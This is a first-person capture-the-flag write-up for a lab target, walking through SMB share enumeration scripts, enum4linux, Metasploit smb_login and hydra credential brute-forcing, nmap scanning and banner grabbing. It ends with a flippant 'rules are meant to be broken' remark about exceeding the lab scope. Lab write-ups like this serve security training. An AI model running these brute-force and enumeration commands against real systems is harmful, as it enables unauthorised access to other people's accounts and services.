# Step 3 CTF

>This CTF was initially tough.<br>
To be fair using the previously learnt enumeration techniques as learn't before, none of them worked and that had gone to my nerves (I was about to punch my laptop)

The lab provided four objectives:

**Flag 1**: “There is a samba share that allows anonymous access. Wonder what’s in there!”

**Flag 2**: “One of the samba users have a bad password. Their private share with the same name as their username is at risk!”

**Flag 3**: “Follow the hint given in the previous flag to uncover this one.”

**Flag 4**: “This is a warning meant to deter unauthorized users from logging in.”

**Target**: target.ine.local

**Tools**: Nmap, Metasploit, Hydra, enum4linux, smbclient

>Began the initial  with enumeration as taught in the videos but nothing seem to be found more than `IPC$` and `print$`
>We had used almost every auxiliary modules from metasploit, hell even created a custom script (below) to enumerate them  
```bash
#!/bin/bash
WORDLIST="/usr/share/seclists/Discovery/SMB/smb-shares.txt"
TARGET="target.ine.local"

echo "[*] Starting SMB share brute-force on $TARGET"
for share in $(cat $WORDLIST); do
    echo "[*] Trying share: $share"
    smbclient //$TARGET/$share -N 2>/dev/null
    if [ $? -eq 0 ]; then
        echo "[+] FOUND VALID SHARE: $share"
        exit 0
    fi
done
```
>But I did a small mistake. I didn't read the question and the provided resources thoroughly and hence the waste of 6 hrs.
>In the question we are already given a custom wordlist `/root/Desktop/wordlists/shares.txt` replacing the previous script with the new wordlist we were successful
```bash
#!/bin/bash
WORDLIST="/root/Desktop/wordlists/shares.txt"
TARGET="target.ine.local"

echo "[*] Starting SMB share brute-force on $TARGET"
for share in $(cat $WORDLIST); do
    echo "[*] Trying share: $share"
    smbclient //$TARGET/$share -N 2>/dev/null
    if [ $? -eq 0 ]; then
        echo "[+] FOUND VALID SHARE: $share"
        exit 0
    fi
done
```
>If you want to feel more like a hacker you can use a one-liner too
```bash
while read -r share; do echo “Testing share: $share”; smbclient “//target.ine.local/$share” -N -c “ls” &>/dev/null && echo “[+] Successfully accessed share: $share”; done < /root/Desktop/wordlists/shares.txt
```
>Also run enum4linux once
```bash
enum4linux -a target.ine.local
```
**Successfully enumerated and found the share**
```
smbclient \\\\target.ine.local\\pubfiles
```
**Got the first flag**
---
During the use of enum4linux, we were able to get the names of users, and now we can use that name to brute force the smb server.

create a file with the user names for our users wordlist
```
echo -e “josh\nnancy\nbob” > usrs.txt
```
Now we can use the Metasploit framework by starting the postgresql service and using the msfconsole command to launch the interface.

Let’s search for the smb_login module which we will be using to brute force the smb server to get the bad password

set the RHOSTS, USER_FILE with the usrs.txt and for PASS_FILE we are gonna use the wordlist which is provided to us (it was just beside shares.txt)

Aha!! got the user and we can login in his share
```bash
smbclient \\\\target.ine.local\\josh -U josh
```
**Got the second flag. Wait why is there a message within?!?!**
---
Run a full port nmap scan
```bash
nmap -p- -sV target.ine.local
```
As seen the port is a custom port now let’s try connecting to the server maybe we can access it anonymously or get a hint

In the banner we can see a list of users having weak passwords now I use the echo command to append the previous usrs.txt file containing the names and we use the hydra command with the path to the users, the port and potential passwords, we could use metasploit modules too

```bash
hydra -L /root/usrs.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt ftp://target.ine.local -s 5554
```
**Got a password for a name and we login, retrieve the third flag (in n out baby)**
---
For the fourth flag we got a warning and as per our enumeration only ssh is left, let's connect
```bash
SSH target.ine.local
```
and lo !! the flag was in the banner only.
>You can go ahead and enumerate or exploit the ssh cos, why not??? Rules are meant to be broken

**Kistimaat !!!**
